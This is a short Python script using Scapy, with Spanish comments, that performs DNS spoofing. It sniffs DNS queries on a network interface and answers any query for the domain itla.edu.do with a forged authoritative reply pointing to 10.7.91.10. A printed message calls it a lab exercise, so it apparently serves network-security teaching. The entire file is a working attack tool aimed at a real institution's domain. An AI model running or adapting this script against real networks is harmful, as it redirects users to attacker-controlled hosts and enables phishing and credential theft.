#!/usr/bin/env python3
import sys
from scapy.all import *


TARGET_DOMAIN = "itla.edu.do."     
FAKE_IP = "10.7.91.10"             
INTERFACE = "eth0"                 

def dns_spoof(pkt):
    # Verificar si el paquete contiene una capa DNS y es una Query (Petición)
    if pkt.haslayer(DNS) and pkt[DNS].opcode == 0 and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname.decode('utf-8')
        
        # Comprobar si el dominio solicitado es el de nuestro objetivo
        if TARGET_DOMAIN in qname:
            print(f"[!] Consulta detectada para: {qname}")
            
            # Construir la respuesta DNS falsa
            spoofed_pkt = (
                IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                DNS(
                    id=pkt[DNS].id,          
                    qr=1,                    
                    aa=1,                    
                    qd=pkt[DNS].qd,          
                    an=DNSRR(rrname=qname, type='A', rclass='IN', ttl=60, rdata=FAKE_IP)
                )
            )
            
            
            send(spoofed_pkt, iface=INTERFACE, verbose=False)
            print(f"[+] Respuesta falsa enviada: {qname} -> {FAKE_IP}\n")

if __name__ == "__main__":
    print(f"[*] Iniciando Sniffer DNS en la interfaz {INTERFACE}...")
    print(f"[*] Monitoreando solicitudes para: {TARGET_DOMAIN.strip('.')}")
    print(f"[*] Redireccionando hacia el servicio local en: {FAKE_IP}")
    print("[-] Presiona Ctrl+C para detener el laboratorio.")
    
    # Filtrar solo por paquetes UDP destinados al puerto 53 (DNS)
    sniff(iface=INTERFACE, filter="udp port 53", prn=dns_spoof, store=0)
